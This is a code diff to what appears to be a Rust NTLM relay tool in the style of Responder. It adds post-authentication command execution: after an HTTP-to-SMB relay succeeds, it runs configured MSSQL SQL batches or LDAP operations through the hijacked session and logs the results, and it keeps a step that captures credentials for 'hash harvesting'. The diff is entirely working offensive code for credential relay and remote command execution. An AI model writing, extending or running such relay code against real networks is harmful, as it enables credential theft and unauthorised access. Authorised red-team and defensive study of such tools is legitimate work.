@@ -675,20 +675,49 @@ impl Responder {
                         match pending {
                             Some((relay_id, challenge_bytes)) => {
                                 let ntlm_owned = ntlm_data.to_vec();
-                                let bridge = bridge.clone();
-                                let result = bridge.handle.block_on(async move {
-                                    let mut relay = bridge.relay.lock().await;
+                                let relay_arc = bridge.relay.clone();
+                                let handle = bridge.handle.clone();
+                                let relay_post = relay_arc.clone();
+                                let result = handle.block_on(async move {
+                                    let mut relay = relay_arc.lock().await;
                                     relay.relay_authenticate(relay_id, &ntlm_owned).await
                                 });
 
                                 match result {
-                                    Ok(session) => {
+                                    Ok(mut session) => {
                                         info!(
                                             "HTTP->SMB relay succeeded: {}\\{} (target: {})",
                                             session.username,
                                             session.domain,
                                             session.target.address
                                         );
+
+                                        // Post-auth command execution (MSSQL SQL batch / LDAP verbs)
+                                        let post_cmd = handle.block_on(async move {
+                                            relay_post.lock().await.post_auth_command()
+                                        });
+                                        if let Some(cmd) = post_cmd {
+                                            let outcome = handle.block_on(async {
+                                                crate::relay::run_post_auth_command(
+                                                    &mut session,
+                                                    &cmd,
+                                                )
+                                                .await
+                                            });
+                                            match outcome {
+                                                Ok(output) => {
+                                                    for line in output.lines() {
+                                                        info!("Post-auth ({}): {}", cmd, line);
+                                                    }
+                                                }
+                                                Err(err) => {
+                                                    warn!(
+                                                        "Post-auth command failed on {}: {}",
+                                                        session.target.address, err
+                                                    );
+                                                }
+                                            }
+                                        }
 
                                         // Also capture the credential for hash harvesting
                                         if let Ok(Some(auth)) = std::panic::catch_unwind(|| {
